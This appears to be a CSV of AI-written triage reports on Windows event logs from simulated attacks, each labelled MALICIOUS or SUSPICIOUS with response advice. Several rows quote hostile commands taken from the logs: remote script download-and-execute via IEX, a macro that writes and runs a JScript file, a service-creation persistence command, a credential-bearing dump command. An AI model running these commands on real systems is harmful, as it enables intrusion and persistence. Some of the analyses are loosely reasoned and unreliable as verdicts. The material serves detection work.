Directory Name,AI Response
SOAPHound - Dump BloodHound Data,"After a thorough analysis of the provided logs, several observations and interpretations can be drawn:

### Suspicious or Anomalous Behavior:
1. **PowerShell Executions:**
   - The PowerShell logs indicate the execution of a script from the directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\bin\\script.exe`. This execution contains potentially sensitive command-line arguments such as `--user`, `--password`, and `--domain`. 
   - The presence of a password (`P@ssword1`) in the command-line is particularly concerning as it might suggest execution of a script designed to interact with domain or user credentials.
   - The use of the `--bhdump`, `--cachefilename c:\\temp\\cache.txt`, and `--outputdirectory c:\\temp\\test2` parameters could indicate that this script is attempting to dump credentials or data and store it in specified locations, possibly indicating data exfiltration or credential dumping activities.

2. **Sysmon Activity:**
   - Multiple instances of legitimate Windows binaries (`wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe`) are executed. While on their own these tools are not inherently suspicious, their use in combination or frequency might be unusual unless associated with administrative tasks. These could be leveraged by attackers to gather information about the system or manipulate logs (`wevtutil`).
   - The frequent invocation of these processes by the user `SERVER002\\admin_test` might indicate scripted automation or, potentially, misuse by an attacker.

### Indicators of Malicious Activity:
- The execution of a script with hardcoded password from a temporary directory, particularly with the inclusion of domain and user-related information, is a strong indicator of malicious behavior, potentially to escalate privileges or exfiltrate data.
- The PowerShell and Sysmon logs suggest chain execution of processes often seen in scripted attacks or during a lateral movement within a network.

### Threats or Risks Identified:
- Potential credential theft or misuse indicated by the logged command-line operations involving passwords and domain information.
- Data exfiltration attempts or system reconnaissance/gathering via the script indicated in the PowerShell logs.
- Abuse of administrative privileges, as indicated by high integrity level processes conducted by `SERVER002\\admin_test`.

### Recommendations and Resolution:
- **Immediate investigation** should focus on verifying the legitimacy of the PowerShell script and its intended use. Investigate access logs and any available file write operations to determine if data was exfiltrated.
- **Credential Audit**: Review and possibly rotate credentials for the account `admin_test` and others if determined necessary, as they might have been compromised.
- **Enhanced Monitoring**: Set up continuous monitoring for similar PowerShell command execution patterns, especially those involving hardcoded sensitive information.
- **Containment**: If it's determined this activity is unauthorized, isolate the machine `Server002` to prevent further unauthorized access.

Based on the findings, the resolution for these logs is: **MALICIOUS**."
Simulate BlackByte Ransomware Print Bombing,"### Analysis of the Logs:

#### Suspicious and Anomalous Behavior:

1. **Multiple Wordpad Executions:**
   - There are numerous instances of `wordpad.exe` being executed in rapid succession. The command line used in the PowerShell event indicates an attempt to execute Wordpad multiple times (75 times specifically), which is unusual behavior:
     ```
     for /l %x in (1,1,75) do start wordpad.exe /p C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data_003note.txt
     ```
   - This loop execution through cmd/powershell could be indicative of a script or command attempting to overload the system or conduct a form of denial-of-service attack on local resources.

2. **Powershell Invocation:**
   - The Powershell execution with a specific command line argument, while not inherently malicious, is peculiar in the context of looping wordpad execution, suggesting automation or scripted activity that might warrant further investigation.

3. **Edge Update Processes:**
   - Numerous Edge Update processes were executed (`MicrosoftEdgeUpdate.exe`), with varying command line arguments relating to updates and service registrations. While edge updates are typically benign, combined with the other activities, it is worth verifying if this aligns with known legitimate update activities.

#### Indicators of Potential Malicious Activity:

- The simultaneous creation of logs for multiple wordpad processes and Edge update processes alongside the use of command-line scripting (Powershell) raises concern because such activity could be a method used to obfuscate malicious actions or could just be the result of an authorized test or automated script gone rogue.

### Assessment and Resolution:

- **SUSPICIOUS:**
  - The high volume and rapid execution of the `wordpad.exe` process suggest the likelihood of an automated or batch process. While there is no definitive indication of malicious intent (such as known malware hashes or indicators of a known attack pattern), the volume and nature of executions are suspicious and warrant further investigation to rule out an automated, rogue job or scripting error.

### Guidance on How to Proceed:

- **Conduct Further Investigation:**
  - Investigate the originating script or process that executed the `powershell` command and spawned the wordpad instances.
  - Validate if there's a known legitimate task or update activity scheduled around this time, possibly reaching out to the IT administrator for confirmation.
  - Collect additional context, such as checking for any corresponding network traffic to see if there's data exfiltration or communication with known bad IPs.
  - Review any changes in the system configuration or software installations around this time for anomalies.

- **Monitor and Observe:**
  - Continue monitoring similar activities on this system to ensure this isn't a recurring activity or the start of a more extensive compromise.
  
By conducting a deeper investigation and gathering more context about the running processes, any associated scripts, or scheduled tasks, you can decide if additional security measures are needed to prevent future occurrences."
Mirror Blast Emulation,"The analysis of the provided Windows event logs reveals potential indicators of malicious activity. Below are the key points derived from the logs:

### Suspicious Activity Observed:
1. **Unusual PowerShell Execution:**
   - There are multiple instances where PowerShell is executed with a complex command line involving changes to the registry (`VBAWarnings`) and references to a file path containing `mirrorblast_emulation.xlsm`.
   - The command modifies registry keys related to Microsoft Office security settings, which can be indicative of an attempt to manipulate macro settings, potentially to execute malicious macros silently.
   - This behavior aligns with tactics used in some malwares to lower security settings for Microsoft Office applications, making it easier to run harmful macros without user intervention.

2. **Frequent Execution of System Utilites:**
   - The logs show repeated execution of legitimate system utilities like `wevtutil.exe` and `conhost.exe`, which might be used in conjunction with another process to aid in hiding or facilitating malicious activities.
   - While these actions can sometimes occur due to legitimate administrator tasks, the frequency and timing, aligned with the suspicious PowerShell execution, should be scrutinized further.

3. **High Privilege Levels:**
   - Processes such as `PowerShell.exe`, `whoami.exe`, and `hostname.exe` are executed under a user with high integrity levels, which could signify that an adversary is attempting to escalate privileges or gather system information.

### Indicators of Compromise:
- The execution of PowerShell to alter registry settings and invoke an Excel document, particularly in a temporary directory known for holding potentially transient or downloaded files, is concerning.
- Changes to security settings can point to preparatory steps in a multi-stage attack, such as delivering and executing a payload hidden within the Excel file.

### Conclusion:
Given the observed behavior:
- The PowerShell command altering registry settings to reduce security for Excel macros and executing an Excel file in a suspect location is a significant indicator of possibly malicious activity.

### Resolution:
- **MALICIOUS**: The combination of unauthorized registry changes, execution of potentially harmful scripts, and high integrity-level process execution typically associated with exploitation efforts strongly indicates potential compromise.

### Guidance:
1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent spread or further interaction with external threats.
   - Conduct a deep forensic analysis of the host, focusing on the executed PowerShell scripts and any associated files in the temporary directories.

2. **Review and Response:**
   - Examine any network connections initiated by `PowerShell.exe` during the suspicious activity period for outbound malicious communications.
   - Analyze the user `SERVER002\admin_test` actions and determine if any unauthorized changes were made intentionally.

3. **Improvement Measures:**
   - Implement enhanced monitoring for PowerShell activity, especially those modifying registry settings.
   - Update group policies to prevent users from altering Office security settings without administrative oversight, especially in high-risk environments.

These steps should help mitigate the risk and prevent future incidents by learning from this potential threat scenario."
Encoded VBS code execution,"After reviewing the provided Windows event logs, I have identified and analyzed the following elements:

### PowerShell Logs
- **Event ID 600 Entries**: There is a recurring pattern of PowerShell script execution using the `IEX` (Invoke-Expression) command, fetching and executing a script from a remote URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`). This is a highly suspicious activity often associated with attempts to download and execute malicious scripts, especially when `IEX` is used due to its ability to execute remote scripts inline.

### Sysmon Logs
- **Process Image Analysis**: Execution of `powershell.exe` followed by `conhost.exe` and sometimes `wevtutil.exe` under the same user (`SERVER002\\admin_test`) indicates a possible suspicious behavior. `conhost.exe` is typically used within legitimate processes, but seeing it repeatedly invoked alongside `powershell.exe` in this context raises a red flag, particularly if executing external scripts.
  
- **Logon and Execution**: Multiple Sysmon events show the `powershell.exe` process being launched, indicating subsequent execution of commands or scripts without further details. The use of elevated privileges (Integrity Level: High) suggests possible administrator access levels.

### General Assessment
- **Indicators of Compromise (IoC)**: The use of `IEX` to execute scripts from external URLs is often aligned with malicious activities. This suggests an attempt to compromise the system by executing potentially harmful scripts remotely.
  
- **Lateral Movement or Persistence**: There is no explicit evidence of lateral movement or persistence mechanisms (such as scheduled tasks or WMI persistence) within the logs, but the execution of external scripts could potentially introduce such mechanisms.

### Resolution
Based on the analysis of the PowerShell script execution pattern, the high integrity level process executions, and the overall behavior as observed in the logs, the activity captured here should be treated as **MALICIOUS**. Although some aspects of system utilities like `wevtutil.exe` and `conhost.exe` can be legitimate in everyday operations, their pattern alongside suspicious PowerShell usage is concerning.

### Guidance
1. **Immediate Action**: Isolate `Server002` to prevent further potential compromise or data exfiltration.
2. **Comprehensive Malware Scan**: Perform a full malware scan using updated security tools to identify any payloads that may have been introduced via the PowerShell scripts.
3. **Review Web Proxy Logs**: Examine web proxy/server logs for other unusual outbound requests made by the suspected host.
4. **Increase Monitoring**: Implement enhanced monitoring on all servers for similar patterns of behavior and fine-tune alerting for suspicious PowerShell executions.
5. **Educate and Train**: Conduct security awareness training on the dangers of executing scripts from untrusted sources.

By investigating and addressing these concerns, the organization can mitigate current risks and enhance its security posture against such threats in the future."
PowerShell Session Creation and Use,"Upon examining the logs provided, a few points and potential concerns emerge. Here is the detailed analysis of the logs:

### Sysmon Logs:
1. **Powershell Execution:**
   - There are multiple instances of `powershell.exe` being executed, particularly the command `New-PSSession`, `Test-Connection`, `Set-Content`, `Get-Content`, and `Remove-Item`. This suggests remote management or scripting actions:
     - The `New-PSSession` could indicate a remote session being established.
     - The use of `Set-Content` and `Remove-Item` around creating and deleting temporary content could be typical automation, but could also suggest attempts to hide transient data or activities.
     - PowerShell is a common dual-purpose tool used both for legitimate administrative tasks and malicious activities, making it important to understand the context.

2. **Event Logs and Conhost:**
   - Many events involve `conhost.exe`, which provides command-line console window services. These are normal under typical usage scenarios but can sometimes be tied to obfuscated or masked activities in modern attack techniques.

3. **Frequent Logging of System Processes:**
   - The presence of numerous benign system processes running with `NT AUTHORITY\SYSTEM` or `SYSTEM` user context, and several `svchost.exe` executions are common on Windows systems. However, they should be checked against known system administration tasks to ensure they align with expected schedules and uses.

### Security Logs:
1. **Anonymous Logons:**
   - There are several instances where `ANONYMOUS LOGON` occurred using the NTLM authentication method. These entries should be investigated further to understand the source and purpose. While it might be part of a routine network behavior or monitoring, it might also indicate potential unauthorized access attempts.

2. **Special Privileges Assigned:**
   - The logs show several entries (Event ID 4672) where privileged accounts are logged on (e.g., SYSTEM account), which includes privileges like SeDebugPrivilege. This could be normal if it aligns with planned operations or application requirements but can be concerning if unexpected.

### Application and PowerShell Logs:
- **Software Protection & Security Center:**
  - Normal operations related to Windows Security Center and Software Protection Platform service (`sppsvc.exe`) appear in the Application logs. No anomalies are immediately evident.
  
- **PowerShell Events:**
  - PowerShell events confirm the execution of scripts with operations on sessions, testing connections, and temporary file manipulations, again associated with `powershell.exe`. These activities align with what can be inferred from Sysmon logs.

### Summary & Resolution:

Based on the above observations, the activities in the logs primarily point to dual-use tools and behaviors that can be leveraged for both benign and suspicious purposes. There are indicators that suggest further scrutiny is warranted:
- The frequent `ANONYMOUS LOGON` entries and the PowerShell usage with session handling and file manipulations should be investigated further.
- Ensure that the activities align with expected tasks or administrator behaviors, particularly regarding script executions and network session activities.

**Resolution: SUSPICIOUS**

Given these indicators, it would be prudent to conduct additional analysis, including:
- Verifying the source and intent of PowerShell scripts and anonymous logons.
- Reviewing network and endpoint defenses for anomalies or breaches during the indicated times.
- Cross-referencing these logs with scheduled tasks, maintenance windows, and configuration adjustments to validate regular operations versus deviations."
OSTap Payload Download,"Upon analyzing the provided Windows event logs, here is a summarized breakdown of the findings:

### Key Observations:

1. **Time Change Events:**
   - Event ID 4616 indicates that svchost.exe altered system time on two occasions in quick succession. This could signify an attempt to manipulate timestamps to cover tracks; however, a legitimate application or system process might also cause this.

2. **Privileged Logon and Privileges:**
   - Multiple 4624 and 4672 events indicate SYSTEM user logons with highly privileged tokens. The SYSTEM account operates with the highest level of privileges on Windows, and frequent privileged logon events are generally expected for system updates and services.

3. **Edge Update Activity:**
   - Multiple Sysmon events (MicrosoftEdgeUpdate.exe and related processes) indicate routine updates or installations, likely from the Edge browser. These processes execute under the SYSTEM context, aligning with usual update behavior.

4. **Suspicious Command-Line Execution:**
   - Sysmon Event ID 1 shows execution of a command via cmd.exe to download a script from a GitHub URL (https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt), store it locally, and then execute it using cscript. Such scripted remote download and execution can be utilized in malicious activities like downloading further payloads or scripts.

5. **Application Installation:**
   - Events related to ""MsiInstaller"" show installation of KB5001716, which aligns with Windows update activities. These appear benign and consistent with system updates.

6. **WMI Provider Host Execution:**
   - The execution of WmiPrvSE.exe commonly occurs on Windows systems for various management tasks; its presence alone without further suspicious context isn't inherently problematic.

7. **Task Scheduler Activity:**
   - Events involving schtasks.exe, responsible for creating/deleting scheduled tasks, appear related to RUXIM (potentially benign in certain contexts) unless verified to be unexpected.

### Assessment:

- **Argument for BENIGN:**
  - Some events such as those related to Windows Update and Edge Update appear consistent with expected behavior for system maintenance and updates.
  
- **Argument for SUSPICIOUS:**
  - The scripted command execution directly from a GitHub URL is concerning, especially without clear documentation of its intent and purpose. It warrants further investigation to ensure it's not a part of malicious scripting activities.
  - Time change events are notable but alone may not confirm malicious activity without other supporting events.

### Recommended Resolution:

Resolution from the analysis suggests that the activity cannot be fully classified as benign due to the potential for suspicious scripting activity but lacks conclusive evidence of outright malicious behavior. Thus, it is prudent to classify the logs as **SUSPICIOUS**.

### Guidance on How to Proceed:

1. **Investigate Script Execution:**
   - Verify the origin and intent of the downloaded script. Review any associated network activity and check for unauthorized or unexpected script execution across the system.

2. **Monitor Time Manipulations:**
   - Ensure no additional or more extended unauthorized time changes occur and that svchost.exe is performing legitimate actions.

3. **Validation of Tasks and Updates:**
   - Confirm the legitimacy of the RUXIM-related scheduled tasks and ensure they align with known enterprise applications or business needs.

In summary, while most activities could be part of routine system updates and maintenance, the remote script execution stands out as a key area of interest, necessitating further investigation."
ATHPowerShellCommandLineParameter -Command parameter variations,"To analyze the logs provided, we should consider the following aspects:

1. **Sysmon Logs Analysis**:
    - **PowerShell Execution**: Multiple logs indicate PowerShell execution (EventID 5). A user `SERVER002\admin_test` executed PowerShell, but there's nothing inherently suspicious about this unless the command line used suggests something nefarious. The PowerShell command involved a suspicious-looking parameter ""Out-ATHPowerShellCommandLineParameter"", which is not a standard or well-documented cmdlet. This could be indicative of a script used for executing hidden PowerShell scripts.
    
    - **Process Creation**: Apart from PowerShell, we see process creations like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and others by the same user. While these tools are legitimate, their use, especially PowerShell and `wevtutil.exe`, can be suspicious in certain contexts. `wevtutil.exe` is a command-line utility that can be used to query or manage event logs, which could be leveraged by an attacker to tamper with logs.

2. **Windows PowerShell Logs Analysis**:
    - The logs reflect the starting of PowerShell host processes with the same command as mentioned in Sysmon logs. This reinforces the possibility of running some scripted operations.

3. **System and Application Logs**:
    - The Windows Update Client logs show normal update processes. There doesn't appear to be any suspicious or unusual behavior here.
    - The Application logs don't display obvious signs of tampering or unusual software activity.

4. **Security Logs Analysis**:
    - EventID 4624 and 4672 indicate a successful logon and the assignment of special privileges. The logon type 5 usually means a service startup. However, having privileges such as `SeDebugPrivilege` can be concerning, depending on what those privileges are used for subsequently.
    - There are repeated attempts (EventID 5379) to access credentials that failed (return code `3221226021` corresponds to a failed access due to the credentials not being able to be retrieved). Repeated credential access attempts could indicate an attempt to escalate privileges or access secured data.

**Assessment**:
- **Suspicious Behavior**: The execution of PowerShell with unusual parameters and repeated credential access attempts, along with high-level privilege assignments, are concerning.
- **Indicators of Potential Malicious Activity**:
  - The unusual PowerShell command and context.
  - Persistent credential access attempts.
  - Granting of high-level privileges to the SYSTEM account, though common in service contexts, paired with other suspicious activities could be indicative of lateral movement preparation.

**Resolution**: 
Considering the above findings, the logs exhibit activity that is definitely concerning but not conclusively malicious without further context or evidence. Therefore, I would categorize this as:
- **SUSPICIOUS**: The activities warrant further investigation, especially around the PowerShell scripts and credential access patterns, to confidently assess whether the activity is indeed malicious.

**Guidance**:
- **Investigate** the specific commands used in the PowerShell executions.
- **Review** the account usage logs for `SERVER002\admin_test` to assess whether any unauthorized or unusual patterns exist.
- **Monitor** subsequent activity related to this user and system for further signs pointing toward malicious behavior."
AutoIt Script Execution,"In the analysis of the provided Windows event logs, several areas of interest and potentially suspicious activity were identified. Here's a detailed breakdown of the logs and their implications:

1. **Security Log Analysis:**
   - **Event ID 4624 (Successful Logon):** A logon event with type 5 indicates a service startup, which is typical for system processes. This is generally considered benign unless additional context from other logs suggests abnormality.
   - **Event ID 4672 (Special Privileges Assigned):** The SYSTEM account received a series of high-level privileges, which is normal behavior for SYSTEM but should be noted if seen alongside suspicious activities.
   - **Event ID 5379 (Credential Validation):** Multiple failed credential validation attempts appear to be related to MicrosoftAccount user and Windows Live tokens, all returning error code 3221226021, suggesting possible credential misconfiguration or failed access.
   - **Event ID 4798 (Enumeration of Local Group Membership):** Multiple lookups on different user accounts were executed by the taskhostw.exe process. This could be indicative of enumeration activity which is often used in lateral movement within a network, potentially suspicious if unexpected.

2. **PowerShell Log Analysis:**
   - **Command Execution:** Logs show PowerShell executing an AutoIt3 script. AutoIt can be used in automation, but it’s also commonly leveraged by attackers for malicious scripting. The script path is within a temporary directory, which is unusual for legitimate operations.

3. **Sysmon Log Analysis:**
   - **Event ID 1 (Process Creation):** Several process creations related to PowerShell and scripts executed by the `admin_test` user account were observed, including:
     - Execution of `calc.au3` script via AutoIt3, triggered by PowerShell. Without more context on the script's purpose, this execution path is suspicious.
   - **Event ID 5 (Process Termination):** Various process termination events, including security-related programs like `wevtutil.exe` and `HOSTNAME.EXE`, could be benign but are noteworthy given surrounding context of scripted actions.
   - **High Integrity Level Processes:** Processes like `whoami.exe` and `powershell.exe` executed at high integrity, typical for such admin-level processes, but warrant scrutiny when tied to suspicious actions.

### Assessment:
- **Unusual Scripting:** Use of PowerShell to initiate an AutoIt3 script from a temporary directory is non-standard and potentially malicious if consistent with malware patterns.
- **Enumeration Activity:** Enumeration of local group memberships could indicate reconnaissance, often a prelude to privilege escalation or lateral movement inside the network.
- **Failed Credential Validations:** Continued credential access attempts could suggest account probing or misconfigurations that require auditing.

### Resolution: SUSPICIOUS
The logs depict suspicious activities, particularly regarding the use of scripting environments (PowerShell and AutoIt), failed credential validations, and account enumeration. These could be indicative of early-stage compromise techniques or policy violations due to script execution and permission probing. Further investigation is required to determine the script's purposes and verify any unauthorized or atypical behavior by the `admin_test` user account.

### Guidance:
- Conduct a deep dive into the script located in `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\calc.au3` to verify its legitimacy and intent.
- Review audit logs for `admin_test` activities and associated tasks to understand the context of enumeration and script execution.
- Reassess security policies to mitigate risks associated with script executions from temporary directories and monitor credentials usage rigorously.
- Validate if there are any scheduled tasks or unauthorized software installations that might correspond to the seen behavior."
Snake Malware Service Create,"**Detailed Analysis of the Logs**

1. **Suspicious Process Execution and Commands:**
   - **EventID 17978 (cmd.exe creating a service with sc.exe):** 
     - The command `cmd.exe /c sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto` is suspicious. This indicates an attempt to create a new service, which is a common persistence mechanism used by malware.

2. **Event Correlation and Context:**
   - The Sysmon logs show the sequence of events where a `cmd.exe` process executed a command to create a new service via the `sc.exe` command.
   - The parent process for these activities is `wsmprovhost.exe`, which hosted these executions. While `wsmprovhost.exe` is a legitimate Windows process related to Windows Remote Management, it being a parent to these events is unusual and suggests the misuse of its embedding capabilities.

3. **Suspicious Service Creation:**
   - **System Log (EventID 7045):** 
     - The service `WerFault Service` is registered with the command path mentioned above. Using environment variables in the service path like `$env:windir` along with an unusual directory under Windows' Side-by-Side version storage (`WinSxS`) is highly suspicious and might indicate an attempt to obfuscate or hide malicious binaries.

4. **Risk and Threat Assessment:**
   - **Risk Level:** High. The creation of a new persistent service with a questionable path and execution context suggests a possible system compromise.
   - **Threat Level:** Confirmed malicious activity, indicated by the unconventional service creation method and use of `cmd.exe` and `sc.exe` with a high integrity level.

5. **Resolution:**
   - **MALICIOUS:** The logs indicate unauthorized creation of a potentially malicious service using Cmd and Sc commands, likely aimed at establishing persistence on the server.

**Guidance on How to Proceed:**
- **Immediate Actions:**
  1. Quarantine the affected host to limit further potential spread or data exfiltration.
  2. Analyze the `WerFault.exe` file within the specified path for any modifications or suspicious activity.
  3. Investigate any other connected systems for similar services or activities.
  
- **Further Investigation:**
  1. Perform a comprehensive review of logs for any indicators of further system exploitation or lateral movement.
  2. Analyze network traffic from `Server002` for connections to known malicious IP addresses or domains.

- **Post-Incident Measures:**
  1. Enhance monitoring to detect similar anomalies in real-time.
  2. Review and limit permissions for remote management tools and ensure they are not misused.
  3. Educate users on the risks of executing or downloading unknown software on their systems.
  
This conclusion and guidance should aid in mitigating the immediate threat and prevent potential future breaches following similar patterns."
Extract Memory via VBA,"Based on the analysis of the provided logs, here are the key points addressed and the corresponding findings:

### Suspicious Activities Identified:

1. **PowerShell Execution with Suspicious Script**:
   - EventID 600 and 403 in the Windows PowerShell logs show the execution of a PowerShell script that fetches and executes a script from a GitHub repository (`iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1""`).
   - The command-line involved suggests execution of potentially malicious scripts, which are often used in attacks for downloading and executing further payloads or for executing commands remotely.

2. **Unusual PowerShell Activity by `admin_test` User**:
   - The account `SERVER002\\admin_test` executed PowerShell, which was involved with external script handling.
   - High integrity level with PowerShell scripting involved in fetching and running remote scripts is highly suspicious and indicative of potential compromise.

### Analysis of Other Entries:

- **Microsoft Edge Update Process**: Multiple logs show MicrosoftEdgeUpdate.exe executing with different command-line options. However, this seems consistent with legitimate software updates unless the context was previously deemed suspicious.

- **Windows System Processes**: Entries for normally expected Windows processes (e.g., svchost.exe, dllhost.exe, etc.) seem typical and are part of regular Windows functionality unless known to be exploited or tampered.

- **Security and System Logs**: Logs like event ID 4624 (successful logon) and 4672 (admin privileges) involving typical SYSTEM accounts seem standard for Windows Server operations.

### Overall Assessment:
The execution of a PowerShell script that involves downloading and executing code from an external repository without prior authorization or known purpose raises significant concern. This type of activity is a common technique employed by attackers for executing arbitrary code and potentially compromising the system further by deploying malware or establishing persistence.

### Resolution:
**MALICIOUS**

### Guidance and Next Steps:

1. **Immediate Isolation**: Isolate the affected system (Server002) from the network to prevent any potential lateral movement or data exfiltration by the malicious actors.

2. **Investigation and Forensics**: Conduct a thorough analysis and forensics investigation to understand the extent of compromise, including checking for persistence mechanisms, analyzing other script activities, and identifying any potential communication with Command & Control (C2) servers.

3. **Review User Accounts**: Immediately review the activities and recent changes related to the `admin_test` user account and other accounts that might be involved in the attack.

4. **Remediation Action**: Remove any unauthorized or potentially malicious scheduled tasks, scripts, or services that might have been installed by the PowerShell script execution.

5. **Updates and Patches**: Ensure all software and operating system patches are up to date to mitigate known vulnerabilities.

6. **Monitor and Alerts**: Enhance monitoring and create alerts for unexpected PowerShell usage and external connections to suspicious domains and scripts.

This activity confirms the presence of potentially malicious operations which require immediate attention to mitigate risks and prevent further impact."
Maldoc choice flags command execution,"Upon reviewing the provided Windows event logs, a number of suspicious events and potential indicators of malicious activity have been identified:

### Anomalous and Suspicious Behavior:

1. **PowerShell Activity**: 
   - All PowerShell events have a recurring command being executed:
     ```
     powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\n
     IEX (iwr \""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\"" -UseBasicParsing)\r\n$macrocode = \""  a = Shell(`\""cmd.exe /c choice /C Y /N /D Y /T 3`\"", vbNormalFocus)\""\r\nInvoke-script -macroCode $macrocode -officeProduct \""Word\""}
     ```
   - This indicates a script being downloaded and executed from a GitHub repository using `Invoke-Expression` (IEX) which is a known pattern used by attackers to execute malicious scripts. The script further attempts to open a command prompt using macros, which could be a sign of an attempt to bypass security implementations.

2. **Sysmon Logs**: 
   - Frequent execution of `wevtutil.exe` and `conhost.exe` within a short period which is not consistent with regular operation.
   - Powershell.exe was observed calling scripts directly in a temp directory, which might suggest unauthorized or suspicious administrative scripts execution.
   - The presence of the `cmd.exe /c choice` command being utilized by scripts could signify evasion techniques to delay execution or bypass detection.

3. **Process Anomalies**:
   - The process chain shows the PowerShell scripts being indirectly triggered through the `wsmprovhost.exe`, which indicates potential remote command execution with high privileges, this is often used by attackers for lateral movement within a network after gaining initial access.

### Conclusion:
The events logged reveal a definite pattern of suspicious behavior associated with potentially malicious activities. Downloading and executing scripts directly from external sources via PowerShell, especially using online script hosting platforms, is a red flag. The use of commands that facilitate script execution with elevated privileges poses a risk of system compromise. Additionally, the organization and repeated usage of several utilities in tandem suggests execution designed to remain under the radar of conventional security measures.

Given these indicators:

### Resolution: MALICIOUS
The activity in these event logs is deemed malicious due to the potential execution of external scripts meant for system compromise or unauthorized administrative operations. Immediate action is recommended to contain and remediate any impact. Furthermore, a deeper investigation is advised to uncover the scope and method of compromise and ensure system integrity. 

### Recommended Actions:
- **Containment**: Isolate the affected host(s) from the network to prevent further lateral movement by the attacker.
- **Investigation**: Conduct a forensic analysis to understand the full extent of the compromise, including monitoring network traffic and reviewing other related logs.
- **Remediation**: Remove malicious software/scripts identified and patch any vulnerabilities exploited by the attacker.
- **Prevention**: Strengthen PowerShell logging and alerting mechanisms. Implement strict script execution policies and monitor for anomalous activities continuously."
OSTAP JS version,"### Analysis of Windows Event Logs

#### Overview
The logs provided contain Sysmon, PowerShell, Application, and Security logs for a Windows host, identified as ""Server002"". The primary focus is on identifying anomalous or suspicious behaviors, such as unauthorized access, unusual PowerShell execution, or privilege escalation attempts, which could suggest malicious activity.

#### Detailed Analysis

1. **Sysmon Logs**
   - **PowerShell Invocation:** 
     - There are multiple instances of PowerShell being executed (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) under the user `SERVER002\\admin_test`. The command executed appears to fetch a script from a URL and executes it.
     - **Command Line Analysis (Record ID: 17989):** 
       - The command line includes:
         ```
         IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"" -UseBasicParsing)
         $macrocode = ""Open `\""C:\\Users\\Public\\art.jse`\"" For Output As #1`n Write #1, `\""WScript.Quit`\""`n Close #1`n a = Shell(`\""cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\"", vbNormalFocus)`n""
         Invoke-script -macroCode $macrocode -officeProduct ""Word""
         ```
       - **Behavior Observed:** This script downloads another script from a GitHub location and writes a potentially dangerous script to a file (`art.jse`) in the public directory, then executes it using `wscript`.
       - **Risk:** This type of behavior is highly suspicious and indicative of a potential compromise. It reflects a typical pattern used in PowerShell-based attacks where scripts are downloaded and executed without apparent authorization.

   - **Host and Whoami Commands:**
     - Commands such as `HOSTNAME.EXE` and `whoami.exe` are also run, indicating information gathering, which can be benign but should be inspected given the context of suspicious PowerShell execution.

2. **Windows PowerShell Logs**
   - The PowerShell log entries corroborate the execution of potentially malicious PowerShell scripts that align with the command line logs observed in the Sysmon logs. They show the execution of a script designed to manipulate scripts or run unauthorized code via PowerShell.

3. **Application Logs**
   - **Edge Update Activity:**
     - Multiple `Microsoft Edge Update` processes are recorded. While Microsoft Edge updaters are legitimate, the context and timing related to the PowerShell events raise a need for scrutiny.
     - Stopping and starting services multiple times in quick succession could suggest tampering or use of these services for persistence techniques.

4. **Security Logs**
   - **Privilege Insights:**
     - Event ID 4672 records show the SYSTEM account possessing numerous privileges, which on its own isn't unusual, but in combination with the potentially malicious activity, any elevated use of privileges can be a concern.

#### Assessment and Resolution
**Resolution: MALICIOUS**

- **Indicators of Compromise:**
  - Unauthorized PowerShell script fetching and execution are strong indicators of malicious activity.
  - The activities indicate an attempt to obfuscate potentially harmful operations by fetching and executing scripts from a remote location.
  - The combination of seemingly benign utility executions (like `whoami.exe`) associated with malicious PowerShell activities strengthens the suspicion of malicious intent.

#### Guidance on How to Proceed
1. **Containment and Mitigation:**
   - Immediately isolate the affected system to prevent further unauthorized activities.
   - Examine network activity to check for other potentially compromised hosts.
   - Block communication with the external IPs or domains from which the scripts were downloaded.

2. **Investigation and Remediation:**
   - Conduct a thorough investigation into the source and distribution vector of the malicious scripts.
   - Review other logs for broader insights, including firewall, proxy logs, and any endpoint detection alerts.
   - Re-image the affected system if necessary, to ensure any remnants of the malicious payload are completely removed.

3. **Future Prevention:**
   - Implement stricter PowerShell execution policy to prevent unauthorized script executions.
   - Update and patch systems regularly and ensure endpoint protection is running and fully operational.
   - Educate users on avoiding suspicious links or email attachments that might lead to the execution of unauthorized scripts."
Excel 4 Macro,"Upon thorough analysis of the provided event logs, the following observations and assessments have been made:

### Suspicious Indicators

1. **PowerShell Activity**: The event logs detail several instances of PowerShell being invoked with complex command-line arguments, which aim to leverage Excel macros and COM objects to automate tasks.

    - **Command-Line Analysis**: 
        - A PowerShell command was executed to create a new COM object for Excel and then manipulated Excel's macro sheets to run a macro named ""runme"".
        - The command uses `FWRITELN` and `FOPEN` within macro sheets to potentially create or manipulate files like ""file_redteam_x4m_exec.vbs"".

2. **External Resource Access**: 
   - The PowerShell script appears to download a file (`procexp.exe`) from an external URL (`https://live.sysinternals.com/procexp.exe`). While Sysinternals tools are legitimate, their download and execution via scripts in this manner can represent an attempt to bypass traditional download and execution paths.
   
3. **Script Behavior**:
   - The script checks if certain files exist and removes them if they do, which can indicate cleanup of evidence or attempts to hide activities.
   - The script involves writing external scripts to disk and tries to execute them, suggesting an attempt at executing potentially harmful code.

### Analysis and Conclusion

- **Observed Behavior**: The logs indicate heavy scripting activity with PowerShell involving automation through Excel, manipulation of files, and connection to external resources.
  
- **Risk Level**: High. Given the nature of the commands, especially the use of Excel COM object with PowerShell and the ability to execute downloaded code, suggests a coordinated attempt to carry out unauthorized operations on the system. This pattern is consistent with tactics used in malware deployment or penetration testing scenarios where attackers use native applications to conduct malicious operations under the guise of legitimate tasks.

### Resolution: MALICIOUS

